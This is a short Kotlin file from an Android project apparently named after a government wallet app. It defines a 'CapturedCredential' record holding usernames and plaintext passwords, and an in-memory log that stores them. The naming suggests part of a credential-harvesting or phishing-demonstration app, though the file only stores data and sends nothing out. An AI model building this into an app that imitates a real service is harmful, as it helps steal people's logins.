package com.example.govgrwallet.data

import androidx.compose.runtime.mutableStateListOf

data class CapturedCredential(
    val username: String,
    val password: String,
    val timestamp: Long = System.currentTimeMillis()
)

object CredentialRepository {
    val logs = mutableStateListOf<CapturedCredential>()

    fun add(credential: CapturedCredential) {
        logs.add(0, credential)
    }
}
